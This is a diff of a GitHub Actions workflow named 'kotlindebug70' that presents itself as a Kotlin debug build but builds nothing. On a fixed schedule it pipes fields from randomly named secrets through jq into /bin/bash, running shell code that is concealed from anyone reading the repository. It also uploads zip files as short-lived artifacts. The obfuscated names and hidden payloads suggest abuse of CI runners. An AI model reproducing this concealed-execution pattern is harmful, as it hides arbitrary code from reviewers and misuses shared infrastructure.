@@ -1,9 +1,9 @@
 name: kotlindebug70
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '59 5/6 * * *'
+    - cron: '35 5,11,17,23 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,12 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: kotlindebug70
         env:
-          mtuv105: ${{ secrets.mtuv105 }}
+          kj17746: ${{ secrets.kj17746 }}
         run: |
-          echo $mtuv105 | jq -r .fhlvs44 | /bin/bash
-          echo $in63 | jq -r .vv01313 | /bin/bash
-          echo $sm82359 | jq -r .pgt2 | /bin/bash
-          echo $kzmi0767 | jq -r .a4096 | /bin/bash
-          echo $gyulg518 | jq -r .ah8056 | /bin/bash
-          echo $xjgiw269 | jq -r .wjr422 | /bin/bash
+          printf '%s' "$kj17746" | jq -r .ekehk442 | /bin/bash
+          printf '%s' "$r737" | jq -r .ywcq0 | /bin/bash
+          printf '%s' "$lk63554" | jq -r .n90 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: iIg9tUWG
+          path: "*.zip"
+          retention-days: 1
